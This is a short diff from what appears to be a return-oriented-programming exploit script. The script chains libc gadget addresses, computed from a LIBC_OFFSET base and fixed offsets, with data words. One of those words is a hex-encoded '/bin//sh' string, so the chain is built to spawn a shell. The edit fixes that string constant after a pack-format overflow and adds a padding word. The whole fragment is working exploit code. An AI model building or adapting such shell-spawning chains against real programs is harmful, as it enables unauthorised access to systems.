@@ -10,7 +10,9 @@ g2 = LIBC_OFFSET + 0x1f940 + 0x1ab776 + 0x1d
 d2 = 0x00
 d3 = 0x00
 g3 = LIBC_OFFSET + 0x1f940 + 0xb8993 + 0xe
-d4 = 0x222f62696e2f2f7368222c30
+d4 = 0x222f62696e2f2f736822 #integer out of range for 'q' format code
+d5 = 0x00
+
 g4 = LIBC_OFFSET + 0x1f940 + 0x132bae + 0xe
 
 
